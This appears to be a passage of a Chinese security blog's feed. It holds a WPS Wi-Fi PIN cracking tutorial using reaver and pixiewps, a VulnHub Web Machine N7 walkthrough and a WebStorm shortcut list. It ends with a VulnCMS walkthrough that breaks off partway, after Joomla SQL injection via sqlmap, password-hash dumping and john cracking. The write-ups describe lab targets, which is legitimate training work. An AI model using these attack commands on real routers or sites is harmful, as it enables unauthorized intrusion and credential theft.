<li><strong>标准本身没有设计锁定机制，目前多个厂商已实现锁定机制（限制失败连接的尝试次数）</strong></li>
<li>包括Linksys在内的很多厂家的无线路由器无法关闭WPS功能</li>
<li>即使在WEB节目中有关闭WPS，配置也不会生效</li>
<li>攻击难度相对较低，防御却十分困难</li>
<li>一般可在4-10小时爆破密码</li>
<li>用计算器直接算出PIN【早期部分厂商的PIN码是AP
MAC的前三字节（转10进制）】</li>
<li>如：C83A35----13122101，00B00C----00045068</li>
</ul>
<h2 id="wps-攻击演示">2. WPS 攻击演示</h2>
<p><strong>因缺设备，当前环境虽有支持WPS的AP，但都做了相应防护升级，所以以下仅演示破解的大体流程。真实破解成功效果可参见：<a
href="https://www.cnblogs.com/qiyeboy/p/5825525.html"
class="uri">https://www.cnblogs.com/qiyeboy/p/5825525.html</a></strong></p>
<h3
id="启动侦听模式后发现支持wps的ap">1、启动侦听模式后，发现支持WPS的AP</h3>
<p><strong>（1）方法一</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wash -F -i wlan0mon</span><br></pre></td></tr></table></figure>
<p><strong>注，-F忽略错误信息</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220602162955739-1665396995.png" /></p>
<p><strong>wash 命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># wash -h                   </span></span><br><span class="line"></span><br><span class="line">Wash v1.6.6 WiFi Protected Setup Scan Tool</span><br><span class="line">Copyright (c) 2011, Tactical Network Solutions, Craig Heffner</span><br><span class="line"></span><br><span class="line">Required Arguments:</span><br><span class="line">        -i, --interface=&lt;iface&gt;              Interface to capture packets on</span><br><span class="line">        -f, --file [FILE1 FILE2 FILE3 ...]   Read packets from capture files</span><br><span class="line"></span><br><span class="line">Optional Arguments:</span><br><span class="line">        -c, --channel=&lt;num&gt;                  Channel to listen on [auto]</span><br><span class="line">        -n, --probes=&lt;num&gt;                   Maximum number of probes to send to each AP <span class="keyword">in</span> scan mode [15]</span><br><span class="line">        -O, --output-file=&lt;filename&gt;         Write packets of interest into pcap file</span><br><span class="line">        -F, --ignore-fcs                     Ignore frame checksum errors</span><br><span class="line">        -2, --2ghz                           Use 2.4GHz 802.11 channels</span><br><span class="line">        -5, --5ghz                           Use 5GHz 802.11 channels</span><br><span class="line">        -s, --scan                           Use scan mode</span><br><span class="line">        -u, --survey                         Use survey mode [default]</span><br><span class="line">        -a, --all                            Show all APs, even those without WPS</span><br><span class="line">        -j, --json                           <span class="built_in">print</span> extended WPS info as json</span><br><span class="line">        -U, --utf8                           Show UTF8 ESSID (does not sanitize ESSID, dangerous)</span><br><span class="line">        -p, --progress                       Show percentage of crack progress</span><br><span class="line">        -h, --<span class="built_in">help</span>                           Show <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line">        wash -i wlan0mon</span><br></pre></td></tr></table></figure>
<p><strong>（2）方法二</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon --wps</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220602163614875-1786105841.png" /></p>
<h3 id="爆破pin码">2、爆破PIN码</h3>
<p><strong>（1）方法一：直接爆破</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220602163400155-1388000768.png" /></p>
<p><strong>（2）方法二：利用漏洞获取</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -K 1</span><br></pre></td></tr></table></figure>
<p><strong>注，reaver破解PIN码时，使用 -K 1
调用命令pixiewps测试AP是否存在漏洞，存在则依据漏洞获取，否则爆破。也可以单独使用pixiewps命令测试，该方法只适用于固定厂商的芯片，成功率很低</strong></p>
<h3 id="获取-psk">3、获取 PSK</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -p 88888888</span><br></pre></td></tr></table></figure>
<p><strong>注，-p 指定PIN</strong></p>
<h3 id="可能存在的问题">4、可能存在的问题</h3>
<ul>
<li>很多厂家实现了锁定机制，所以爆破时应注意 <strong>限速</strong></li>
<li><strong>一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定</strong></li>
</ul>
<h3
id="综合自动化无线密码破解工具wifite">5、综合自动化无线密码破解工具wifite</h3>
<p><strong>可自动创建监听网卡，破解流程基本和前面的相同</strong></p>
<p><strong>演示</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220602170511268-1258049148.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220602170937704-1118582776.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220602171029629-682707088.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Web Machine: (N7)</title>
    <url>/2024/04/13/Web%20Machine%20(N7)/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a href="https://www.vulnhub.com/entry/web-machine-n7,756/">Web
Machine: (N7) ~ VulnHub</a></p>
</blockquote>
<h2 id="主机探测">1. 主机探测</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: 10.0.3.0/24   |   Screen View: Unique Hosts            </span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240        </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">10.0.3.1        52:54:00:12:35:00      1      60  Unknown vendor             </span><br><span class="line">10.0.3.2        52:54:00:12:35:00      1      60  Unknown vendor      </span><br><span class="line">10.0.3.3        08:00:27:<span class="built_in">df</span>:ce:68      1      60  PCS Systemtechnik GmbH    </span><br><span class="line">10.0.3.9        08:00:27:ed:bd:c7      1      60  PCS Systemtechnik GmbH </span><br></pre></td></tr></table></figure>
<p>靶机：10.0.3.9</p>
<h2 id="端口扫描">2. 端口扫描</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 11:22 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.0.3.9 (10.0.3.9)</span><br><span class="line">Host is up (0.0039s latency).</span><br><span class="line">Not shown: 65534 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.46 ((Debian))</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.46 (Debian)</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:ED:BD:C7 (Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string">Device type: general purpose</span></span><br><span class="line"><span class="string">Running: Linux 4.X|5.X</span></span><br><span class="line"><span class="string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span></span><br><span class="line"><span class="string">OS details: Linux 4.15 - 5.8</span></span><br><span class="line"><span class="string">Network Distance: 1 hop</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">TRACEROUTE</span></span><br><span class="line"><span class="string">HOP RTT     ADDRESS</span></span><br><span class="line"><span class="string">1   3.93 ms 10.0.3.9 (10.0.3.9)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 51.02 seconds</span></span><br></pre></td></tr></table></figure>
<h2 id="web-信息收集">3. Web 信息收集</h2>
<p>80 部署了博客，主页有个 profile，能成功访问 profile.php
页面，但响应页面空白，看响应信息 cookie 有点特殊</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141153900.png" /></p>
<p>cookie：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user=JGFyZ29uMmkkdj0xOSRtPTY1NTM2LHQ9NCxwPTEkZFhOa09XWlBXbTlzVlRoaVpGVnJhZyRvS0VLRW9qckhHMWRhV1dIbkpTTzhSb2RDOEVyc1Nnc3lzQ2NVYnRpNDk4; role=MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%253D</span><br></pre></td></tr></table></figure>
<p>解码 user</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141154938.png" /></p>
<p>john 尝试破解未果！</p>
<p>解码 role：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141201448.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=</span><br><span class="line">=&gt;</span><br><span class="line">21232f297a57a5a743894a0e4a801fc3</span><br></pre></td></tr></table></figure>
<p>查 md5 是 admin</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141203279.png" /></p>
<p>不知道怎么用……</p>
<p>扫目录之后又找到个 exploit.html，有上传文件的功能</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141225353.png" /></p>
<p>存在 CSRF，修改源码上传文件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141225354.png" /></p>
<p>尝试上传 shell</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141229370.png" /></p>
<p>未成功，只得个 <code>FLAG&#123;N7</code> ，why？？</p>
<p>换字典再次扫目录依旧没找到其他目录……看了其他人的 WP，有个
enter_network 目录……</p>
<p>访问需要登录，尝试注入并扫目录</p>
<p>user 字段存在注入，sqlmap 在 login 表得到 flag</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141235195.png" /></p>
<p>目录扫描到个 admin.php</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Target: http://10.0.3.9/</span><br><span class="line"></span><br><span class="line">[00:05:31] Starting: enter_network/</span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccess.bak1                     </span><br><span class="line">[00:05:42] 403 -  273B  - /enter_network/.ht_wsr.txt                        </span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccess.sample</span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccess.orig                     </span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccess.save</span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccessBAK                       </span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccess_sc</span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccess_orig</span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccessOLD2                      </span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htm                               </span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.html</span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccess_extra</span><br><span class="line">[00:05:43] 403 -  273B  - /enter_network/.htaccessOLD                       </span><br><span class="line">[00:05:44] 403 -  273B  - /enter_network/.htpasswd_test                     </span><br><span class="line">[00:05:44] 403 -  273B  - /enter_network/.htpasswds                         </span><br><span class="line">[00:05:44] 403 -  273B  - /enter_network/.httr-oauth                        </span><br><span class="line">[00:05:52] 403 -  273B  - /enter_network/.php                               </span><br><span class="line">[00:06:38] 200 -  108B  - /enter_network/admin.php </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141244780.png" /></p>
<h2 id="补充">4. 补充</h2>
<p>看其他人的 WP 说 cookie 是可利用的，在上面界面修改
role=admin，即可得后半部分 flag……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404141244781.png" /></p>
<p>和 profile.php 所组即为 FLAG{N7 KSA_01}</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Webstorm常用快捷键</title>
    <url>/2021/05/11/Webstorm%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<p><strong>1. 常用快捷键</strong></p>
<p>1. ctrl + shift + n:
打开工程中的文件，目的是打开当前工程下任意目录的文件。<br />
2. ctrl + j: 输出模板<br />
3. ctrl + b: 跳到变量申明处<br />
4. ctrl + alt + T: 围绕包裹代码(包括zencoding的Wrap with
Abbreviation)<br />
5. ctrl + []: 匹配 {}[]<br />
6. ctrl + F12: 可以显示当前文件的结构<br />
7. ctrl + x:
剪切(删除)行，不选中，直接剪切整个行，如果选中部分内容则剪切选中的内容<br />
8. alt + left/right:标签切换<br />
9. ctrl + r: 替换<br />
10. ctrl + shift + up: 行移动<br />
11. shift + alt + up: 块移动(if(){},while(){}语句块的移动)<br />
12. ctrl + d: 行复制<br />
13. ctrl + shift + ]/[: 选中块代码<br />
14. ctrl + / : 单行注释<br />
15. ctrl + shift + / : 块注释<br />
16. ctrl + shift + i : 显示当前CSS选择器或者JS函数的详细信息<br />
17. ctrl + '-/+':
可以折叠项目中的任何代码块，它不是选中折叠，而是自动识别折叠。<br />
18. ctrl + '.': 折叠选中的代码的代码。<br />
19. shift + esc:
当前激活的任意小窗口最小化，也可以是alt+数字键，数字在小窗口有显示。<br />
20. alt + '7': 显示当前的函数结构。<br />
21.
如果是*.html页面，则在文件名下的导航栏某DOM结构上右键，可以全选当前DOM结构。</p>
<p><strong>2. 导航</strong></p>
<table>
<thead>
<tr class="header">
<th><strong>Webstorm快捷键</strong></th>
<th><strong>Eclipse快捷键</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>esc</strong></td>
<td><strong>esc</strong></td>
<td>进入代码编辑区域</td>
</tr>
<tr class="even">
<td><strong>alt+F1</strong></td>
<td><strong>alt+F1</strong></td>
<td>查找代码在其他界面模块的位置，颇为有用</td>
</tr>
<tr class="odd">
<td><strong>ctrl+G</strong></td>
<td><strong>ctrl+L</strong></td>
<td>到指定行的代码</td>
</tr>
<tr class="even">
<td><strong>ctrl+]/[</strong></td>
<td><strong>ctrl+]/[</strong></td>
<td>光标到代码块的前面或后面</td>
</tr>
<tr class="odd">
<td><strong>alt+up/down</strong></td>
<td><strong>ctrl+shift+up/down</strong></td>
<td>上一个/下一个方法</td>
</tr>
</tbody>
</table>
<p><strong>3. 代码编辑</strong></p>
<table>
<thead>
<tr class="header">
<th><strong>Webstorm快捷键</strong></th>
<th><strong>Eclipse快捷键</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>ctrl+D</strong></td>
<td><strong>ctrl+shift+</strong> ↑</td>
<td>复制当前行</td>
</tr>
<tr class="even">
<td><strong>ctrl+W</strong></td>
<td><strong>alt+shift+</strong> ↑</td>
<td>选中单词</td>
</tr>
</tbody>
</table>
<p><strong>ctrl+</strong> &lt;-/-&gt; **<br />
<strong>| </strong>ctrl+** &lt;-/-&gt; **<br />
<strong>| 以单词作为边界跳光标位置<br />
</strong>alt+insert** | <strong>alt+insert</strong> |
新建一个文件或其他<br />
<strong>ctrl+alt+L</strong> | <strong>ctrl+alt+L</strong> |
格式化代码<br />
<strong>shift+tab/tab</strong> | <strong>shift+tab/tab</strong> |
减少/扩大缩进（可以在代码中减少行缩进）<br />
<strong>ctrl+Y</strong> | <strong>ctrl+D</strong> | 删除一行<br />
<strong>shift+enter</strong> | <strong>shift+enter</strong> |
重新开始一行（无论光标在哪个位置）</p>
<p><strong>4. 界面操作</strong></p>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Webstorm快捷键</strong></th>
<th><strong>Eclipse快捷键</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>ctrl+shift+A</strong></td>
<td><strong>ctrl+shift+A</strong></td>
<td>快速查找并使用编辑器所有功能（必记）</td>
</tr>
<tr class="even">
<td><strong>alt+[0-9]</strong></td>
<td><strong>alt+[0-9]</strong></td>
<td>快速拆合功能界面模块</td>
</tr>
<tr class="odd">
<td><strong>ctrl+shift+F12</strong></td>
<td><strong>ctrl+shift+F12</strong></td>
<td>最大区域显示代码（会隐藏其他的功能界面模块）</td>
</tr>
<tr class="even">
<td><strong>alt+shift+F</strong></td>
<td><strong>alt+shift+F</strong></td>
<td>将当前文件加入收藏夹</td>
</tr>
<tr class="odd">
<td><strong>ctrl+alt+s</strong></td>
<td><strong>ctrl+alt+s</strong></td>
<td>打开配置窗口</td>
</tr>
<tr class="even">
<td><strong>ctrl+tab</strong></td>
<td><strong>ctrl+tab</strong></td>
<td>切换代码选项卡（还要进行此选择，效率差些）</td>
</tr>
<tr class="odd">
<td><strong>alt+</strong> &lt;-/-&gt;</td>
<td><strong>alt+</strong> &lt;-/-&gt;</td>
<td>切换代码选项卡</td>
</tr>
<tr class="even">
<td><strong>ctrl+F4</strong></td>
<td><strong>ctrl+F4</strong></td>
<td>关闭当前代码选项卡</td>
</tr>
</tbody>
</table>
<p><strong>5. 查找/替换</strong></p>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>Webstorm快捷键</strong></th>
<th><strong>Eclipse快捷键</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><strong>ctrl+shift+N</strong></td>
<td><strong>ctrl+shift+R</strong></td>
<td>通过文件名快速查找工程内的文件（必记）</td>
</tr>
<tr class="even">
<td><strong>ctrl+shift+alt+N</strong></td>
<td><strong>ctrl+shift+alt+N</strong></td>
<td>通过一个字符快速查找位置（必记）</td>
</tr>
<tr class="odd">
<td><strong>ctrl+F</strong></td>
<td><strong>ctrl+F</strong></td>
<td>在文件内快速查找代码</td>
</tr>
<tr class="even">
<td><strong>F3</strong></td>
<td><strong>ctrl+K</strong></td>
<td>查找下一个</td>
</tr>
<tr class="odd">
<td><strong>shift+F3</strong></td>
<td><strong>ctrl+shift+K</strong></td>
<td>查找上一个</td>
</tr>
<tr class="even">
<td><strong>ctrl+R</strong></td>
<td><strong>ctrl+F</strong></td>
<td>文件内代码替换</td>
</tr>
<tr class="odd">
<td><strong>ctrl+shift+R</strong></td>
<td></td>
<td>指定目录内代码批量替换</td>
</tr>
<tr class="even">
<td><strong>ctrl+shift+F</strong></td>
<td><strong>ctrl+H</strong></td>
<td>指定目录内代码批量查找</td>
</tr>
</tbody>
</table>
<p><strong>参考自：</strong> https://www.jb51.net/softjc/232839.html</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>VulnCMS: 1</title>
    <url>/2024/04/01/VulnCMS%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a href="https://www.vulnhub.com/entry/vulncms-1,710/">VulnCMS:
1 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts</span><br><span class="line">4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240       </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.159.1   00:50:56:c0:00:08      1      60  VMware, Inc.   </span><br><span class="line">192.168.159.2   00:50:56:e0:3a:a5      1      60  VMware, Inc.   </span><br><span class="line">192.168.159.146 00:0c:29:b5:08:b2      1      60  VMware, Inc.   </span><br><span class="line">192.168.159.254 00:50:56:f6:9f:7d      1      60  VMware, Inc.  </span><br></pre></td></tr></table></figure>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.159.146 -p1-65535</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-31 22:41 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.146 (192.168.159.146)</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 65530 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8c:9f:7e:78:82:ef:76:f6:26:23:c9:52:6d:aa:fe:d0 (RSA)</span><br><span class="line">|   256 2a:e2:f6:d2:52:1c:c1:d0:3d:aa:40:e6:b5:08:1d:45 (ECDSA)</span><br><span class="line">|_  256 fa:c9:eb:58:e3:d2:b7:4a:74:77:<span class="built_in">fc</span>:69:0e:b6:68:08 (ED25519)</span><br><span class="line">80/tcp   open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: W3.CSS Template</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">5000/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: fsociety &amp;<span class="comment">#8211; Just another WordPress site</span></span><br><span class="line">|_http-generator: WordPress 5.7.2</span><br><span class="line">8081/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">| http-robots.txt: 15 disallowed entries </span><br><span class="line">| /joomla/administrator/ /administrator/ /bin/ /cache/ </span><br><span class="line">| /cli/ /components/ /includes/ /installation/ /language/ </span><br><span class="line">|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/</span><br><span class="line">|_http-title: Home</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: Joomla! - Open Source Content Management</span><br><span class="line">9001/tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: fsociety.web</span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">MAC Address: 00:0C:29:B5:08:B2 (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.8</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.57 ms 192.168.159.146 (192.168.159.146)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 30.03 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>端口：22,80,5000,8081,9001</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>80 端口</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011606790.png" /></p>
<p>about.html：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Mobley:</span><br><span class="line"></span><br><span class="line">People are all just people, right? When it gets down to it, everyone鈥檚 the same. They love something. They want something. They fear something. Specifics <span class="built_in">help</span>, but specifics don鈥檛 change the way that everyone is vulnerable. It just changes the way that we access those vulnerabilities.  </span><br><span class="line"></span><br><span class="line">Elloit:</span><br><span class="line"></span><br><span class="line">Don<span class="string">&#x27;t try to brute force the vulnerable stuff, it doesn&#x27;</span>t work everytime.</span><br></pre></td></tr></table></figure>
<p>Mobley 和 Elloit 可能是两个可用用户名，不过看 Elloit
的提示，猜测爆破没戏……</p>
<p>/vulnerable/ 下找到几张图片，可能存在隐写，下载到 kali 逐张分析下</p>
<p>image4.jpg 有嵌入文件</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011614068.png" /></p>
<p>没看懂意图……暂存</p>
<p>5000 端口，部署了 WordPress 5.7.2，看源码发现需要修改 hosts，将
fsociety.web 指向192.168.159.146，用 wpscan 先扫下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://fsociety.web:5000/&quot;</span> --ignore-main-redirect --force  -eu </span><br></pre></td></tr></table></figure>
<p>找到个用户 wordpress_admin，尝试爆破未果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl -w wp_passwd.txt http://fsociety.web:5000/  </span><br><span class="line">wpscan --url <span class="string">&quot;http://fsociety.web:5000/&quot;</span> --usernames wordpress_admin --passwords wp_passwd.txt  </span><br><span class="line">wpscan --url <span class="string">&quot;http://fsociety.web:5000/&quot;</span> --usernames wordpress_admin --passwords rockyou.txt </span><br></pre></td></tr></table></figure>
<p>扫目录也没注意到有可利用信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://fsociety.web:5000/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,txt -f</span><br></pre></td></tr></table></figure>
<p>8081 端口，部署了 Joomla
CMS，历史漏洞比较多，先确定版本靶机部署的版本，MSF 中找到个
<code>auxiliary/scanner/http/joomla_version</code> ，扫描得到了 Joomla
的版本 3.4.3</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011627055.png" /></p>
<p>进一步在 <a href="https://www.exploit-db.com/">Exploit Database -
Exploits for Penetration Testers, Researchers, and Ethical Hackers</a>
找到个 sql 注入漏洞 <a
href="https://www.exploit-db.com/exploits/38534">Joomla! 3.2.x &lt;
3.4.4 - SQL Injection - PHP webapps Exploit</a></p>
<p>利用 sqlmap 查数据表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.159.146:8081/index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=75&amp;type_id=1&amp;list[select]=1&quot;</span> -p list[<span class="keyword">select</span>] --dbs --batch  </span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.159.146:8081/index.php?option=com_contenthistory&amp;view=history&amp;list[ordering]=&amp;item_id=75&amp;type_id=1&amp;list[select]=1&quot;</span> -p list[<span class="keyword">select</span>] --batch  -D joomla_db -T hs23w_users --dump</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011633972.png" /></p>
<p>可用信息如下</p>
<table>
<colgroup>
<col style="width: 23%" />
<col style="width: 62%" />
<col style="width: 15%" />
</colgroup>
<thead>
<tr class="header">
<th>email</th>
<th>password</th>
<th>username</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Fluntence54@armyspy.com</td>
<td><code>$2y$10$EYc6SKfMLzlLE/IcD9a6XeAe2Uv7WTBFlbbqRrnpht1K0M1bLrWee</code></td>
<td>joomlaCMS_admin</td>
</tr>
<tr class="even">
<td>5T3e!_M0un7i@N</td>
<td><code>$2y$10$jddnEQpjriJX9jPxh6C/hOag4ZZXae4iVhL7GVRPC9SHWgqbi4SYy</code></td>
<td>elliot</td>
</tr>
</tbody>
</table>
<p>虽然得到了两个用户信息，但密码都加密了，利用 sqlmap
写入shell未成功！尝试用 john 爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john user_pass --format=crypt --wordlist=rockyou.txt</span><br></pre></td></tr></table></figure>
<p>跑了半天未出，估计不大可能了，利用用户名和邮箱生成个字典试试【<a
href="https://weakpass.com/generate">Weakpass</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john user_pass --format=crypt --wordlist=user_password.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404011747105.png" /></p>
<p>爆破出一个 <code>elliot:5T3e!_M0un7i@N</code>
……邮箱就是密码……估计可在 22 端口登录，暂存</p>
